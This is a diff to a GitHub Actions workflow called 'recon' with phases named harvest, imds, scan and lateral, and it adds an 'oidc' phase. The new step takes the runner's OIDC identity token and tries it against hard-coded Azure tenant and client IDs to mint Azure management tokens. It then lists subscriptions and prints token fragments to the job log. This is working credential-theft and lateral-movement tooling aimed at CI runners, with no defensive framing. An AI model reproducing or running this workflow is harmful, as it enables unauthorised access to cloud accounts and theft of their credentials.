@@ -3,9 +3,12 @@ on:
   workflow_dispatch:
     inputs:
       phases:
-        description: 'comma list: harvest,imds,scan,lateral'
+        description: 'comma list: harvest,imds,scan,lateral,oidc'
         required: false
-        default: 'harvest,imds,scan,lateral'
+        default: 'harvest,imds,scan,lateral,oidc'
+permissions:
+  id-token: write
+  contents: read
 jobs:
   recon:
     runs-on: [self-hosted, gpu]
@@ -20,6 +23,34 @@ jobs:
         run: |
           echo "JOB_HOST=$(hostname) ID=$(id -u) PHASES=${{ inputs.phases }}"
           ulimit -n 65535 || true
+      - name: oidc
+        if: contains(inputs.phases, 'oidc')
+        shell: bash
+        run: |
+          set +e
+          echo "OIDC_URL_PREFIX=${ACTIONS_ID_TOKEN_REQUEST_URL:0:50}"
+          OIDC=$(curl -s -m 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          echo "OIDC_RESP=${OIDC:0:120}"
+          TOK=$(python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" <<<"$OIDC" 2>/dev/null)
+          if [ -z "$TOK" ]; then echo "NO_OIDC_TOKEN"; exit 0; fi
+          echo "OIDC_LEN=${#TOK}"
+          for TEN in e8adc959-bf67-48e0-95b4-318b5f73946c 59fa7797-8090-4b20-9f2b-2b7c4c7e3d2a; do
+          for CID in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 e3d1f2c5-7cbb-4b6e-9b1c-1c0b7d0c5a11; do
+            R=$(curl -s -m 25 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
+              --data-urlencode grant_type=client_credentials \
+              --data-urlencode client_id=$CID \
+              --data-urlencode scope=https://management.azure.com/.default \
+              --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
+              --data-urlencode client_assertion=$TOK)
+            echo "MINT $TEN $CID => ${R:0:220}"
+            AT=$(python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" <<<"$R" 2>/dev/null)
+            if [ -n "$AT" ]; then
+              echo "ARM_TOKEN_OK len=${#AT}"
+              curl -s -m 30 -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions?api-version=2022-12-01" | head -c 800
+              echo
+            fi
+          done
+          done
       - name: harvest
         if: contains(inputs.phases, 'harvest')
         run: bash az/harvest.sh
